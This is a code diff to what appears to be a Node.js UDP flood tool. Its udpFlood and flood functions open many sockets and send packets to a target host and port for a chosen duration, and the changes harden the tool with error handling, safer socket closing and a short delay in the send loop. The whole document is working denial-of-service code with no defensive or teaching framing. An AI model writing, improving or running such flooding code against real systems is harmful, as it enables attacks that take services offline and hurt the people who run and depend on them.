@@ -21,16 +21,22 @@ async function udpFlood(target, duration, intensity = 100) {
 
     const sockets = [];
     for (let i = 0; i < intensity; i++) {
-      const socket = dgram.createSocket('udp4');
-      sockets.push(socket);
-      flood(hostname, port, duration, socket);
+      try {
+        const socket = dgram.createSocket('udp4');
+        sockets.push(socket);
+        flood(hostname, port, duration, socket);
+      } catch (socketError) {
+        console.error(`Error creating socket: ${socketError}`);
+      }
     }
 
     await new Promise(resolve => setTimeout(resolve, duration * 1000));
 
     sockets.forEach(socket => {
       try {
-        socket.close();
+        if (socket && !socket.closed) { // Check if the socket exists and is not already closed
+          socket.close();
+        }
       } catch (err) {
         console.error(`Error closing socket: ${err}`);
       }
@@ -50,21 +56,29 @@ async function flood(hostname, port, duration, socket) {
 
       socket.send(message, port, hostname, (err) => {
         if (err) {
+          // Only log the error, don't close the socket here as other sends might be pending
           console.error(`UDP send error: ${err}`);
         }
       });
 
+
       socket.on('error', (err) => {
         console.error(`Socket error: ${err}`);
         try {
+          if (socket && !socket.closed) { // Check if the socket exists and is not already closed
             socket.close();
+          }
         } catch(closeErr) {
-            console.error(`Error closing socket after error: ${closeErr}`);
+          console.error(`Error closing socket after error: ${closeErr}`);
         }
       });
+
+
     } catch (error) {
       console.error(`Error creating or sending UDP packet: ${error}`);
     }
+    // Add a small delay to avoid excessive CPU usage. Adjust as needed.
+    await new Promise(resolve => setTimeout(resolve, 1));
   }
 }
 
